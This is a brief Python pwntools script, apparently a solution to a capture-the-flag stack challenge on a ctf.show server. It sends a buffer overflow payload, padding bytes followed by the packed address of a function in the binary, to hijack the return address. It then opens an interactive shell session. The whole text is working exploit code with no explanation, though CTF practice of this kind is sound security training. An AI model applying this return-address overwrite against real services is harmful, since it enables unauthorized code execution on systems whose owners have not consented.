from pwn import *

io = remote('pwn.challenge.ctf.show', 28185)
e = ELF('stack')
address = e.symbols['stack']
log.success('stack_func_address => %s' % hex(address).upper())
payload = b'a'*(0x9 + 0x4) + p32(address)
# payload = b'a'*(0x9 + 0x4) + p32(0x804850F)
io.sendline(payload)
io.interactive()